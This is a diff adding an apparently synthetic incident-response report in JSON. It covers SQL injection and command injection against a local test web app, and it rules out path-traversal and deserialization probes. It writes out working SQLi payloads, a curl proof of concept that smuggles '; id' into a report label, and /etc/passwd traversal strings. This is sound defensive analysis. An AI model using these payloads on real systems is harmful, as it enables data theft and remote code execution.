@@ -1,0 +1,68 @@
+{
+  "target": "docs/harness-run/dnr/logs (synthetic corpus from the live pentest traffic)",
+  "incidents": [
+    {
+      "id": "INC-1",
+      "title": "SQL injection against /issues/search exfiltrated the full issue table",
+      "verdict": "confirmed_exploited",
+      "attacker_ips": ["203.0.113.77"],
+      "accounts_involved": [],
+      "vuln": {"type": "sql-injection", "route": "GET /issues/search", "file": "src/Data/IssueRepository.cs", "function": "Search"},
+      "timeline": [
+        {"ts": "21/Jul/2026:11:02:33", "event": "recon: GET /issues/search?q=test -> 200"},
+        {"ts": "21/Jul/2026:11:03:14", "event": "SQLi probe: q=' (bare quote) -> 200"},
+        {"ts": "21/Jul/2026:11:03:20", "event": "SQLi: q=' OR '1'='1 (tautology) -> 200, size 410"},
+        {"ts": "21/Jul/2026:11:03:46", "event": "SQLi: q=' OR 1=1-- -> 200, size 412 (all rows)"},
+        {"ts": "21/Jul/2026:11:04:23", "event": "SQLi: q=' UNION SELECT sqlite_version()-- -> 200"},
+        {"ts": "21/Jul/2026:11:04:51", "event": "SQLi: q=' UNION SELECT sql FROM sqlite_master-- -> 200, size 900 (schema)"}
+      ],
+      "impact": "Full read of the issues table (4 rows this corpus, incl. 1 titled 'CONFIDENTIAL: prod DB credentials rotation') plus DB fingerprint (sqlite_version) and schema (sqlite_master). Response sizes climb 90 -> 412 -> 900 bytes across the escalation — an egress tell. No alert fired on this activity.",
+      "evidence": [
+        "access.log: grep 'curl/8.5.0' | injection-grammar filter -> 5 injection requests from 203.0.113.77, all HTTP 200",
+        "access.log: response sizes for the campaign 90/410/412/300/900 (data returned, not an error page)",
+        "src/Data/IssueRepository.cs:21: CommandText concatenates `q` directly into the LIKE clause"
+      ],
+      "poc": {"command": "curl -s 'http://127.0.0.1:5081/issues/search' --data-urlencode \"q=' OR 1=1--\" -G", "verified": true, "response_excerpt": "[\"Login page typo\",\"Dark mode request\",\"CONFIDENTIAL: prod DB credentials rotation\",\"Checkout button misaligned\"]"}
+    },
+    {
+      "id": "INC-2",
+      "title": "OS command injection via /reports/export achieved remote code execution",
+      "verdict": "confirmed_exploited",
+      "attacker_ips": ["203.0.113.77"],
+      "accounts_involved": [],
+      "vuln": {"type": "command-injection", "route": "POST /reports/export", "file": "src/Export/ReportExporter.cs", "function": "Export"},
+      "timeline": [
+        {"ts": "21/Jul/2026:11:07:36", "event": "POST /reports/export -> 200, size 260 (command output returned)"},
+        {"ts": "21/Jul/2026:11:07:45", "event": "POST /reports/export -> 200, size 180 (second command)"}
+      ],
+      "impact": "Arbitrary command execution as the service account (uid=1000 vscode). The injected `label` breaks out of the /bin/sh -c string; stdout is returned in the HTTP response. From here an attacker can read the SQLite DB, the attachment root, and any file the service user can reach. No alert fired.",
+      "evidence": [
+        "access.log: 203.0.113.77 POST /reports/export -> 200 at 11:07:36 and 11:07:45, immediately after the failed 500 probes",
+        "src/Export/ReportExporter.cs:13: Arguments concatenates `label` into '-c \"pandoc ... /tmp/report_<label>.out\"'"
+      ],
+      "poc": {"command": "curl -s -X POST http://127.0.0.1:5081/reports/export -H 'Content-Type: application/json' -d '{\"format\":\"html\",\"label\":\"x; id; echo DNR_POC_$(hostname) #\"}'", "verified": true, "response_excerpt": "uid=1000(vscode) gid=1000(vscode) groups=1000(vscode),996(pipx)... DNR_POC_codespaces-aa33f9"}
+    }
+  ],
+  "ruled_out": [
+    {
+      "subject": "203.0.113.77 path-traversal attempts on /attachments (2 requests, both 500)",
+      "verdict": "attempted_not_vulnerable",
+      "reason": "Attack traffic real (GET /attachments/..%2f..%2f..%2fetc%2fpasswd and /%2fetc%2fpasswd), but the app is not exploitable via this route: default Kestrel keeps %2f literal for a single-segment {name} route, so src/Files/AttachmentService.cs:12 opens a literally-named file and throws FileNotFoundException (app-error.log confirms). Negative PoC fired locally: HTTP 500, no file read. Sink is a real code flaw (latent) but the HTTP trigger bounces."
+    },
+    {
+      "subject": "203.0.113.77 insecure-deserialization probes on /backups/restore (2 requests, both 500)",
+      "verdict": "attempted_not_vulnerable",
+      "reason": "src/Restore/BackupService.cs uses TypeNameHandling.All (a real sink), but reader.ReadToEnd() is a synchronous body read blocked by ASP.NET default AllowSynchronousIO=false — the request throws InvalidOperationException before the deserializer (app-error.log confirms). Negative PoC fired locally: HTTP 500. Not reachable over HTTP as-wired."
+    },
+    {
+      "subject": "Alert A-1002 (http.404_rate) from 198.51.100.41 on /favicon.ico",
+      "verdict": "benign",
+      "reason": "Browser requesting a missing favicon; normal UA, normal volume, no attack grammar. Noise."
+    },
+    {
+      "subject": "Alert A-1001 (waf.path_traversal) from 203.0.113.77",
+      "verdict": "benign",
+      "reason": "Alert is REAL attacker activity but the attack it flagged FAILED (see the traversal ruled_out above). Kept here to note the detection gap: the alert queue fired on the one attack that bounced and stayed silent on the SQLi and RCE that succeeded."
+    }
+  ]
+}
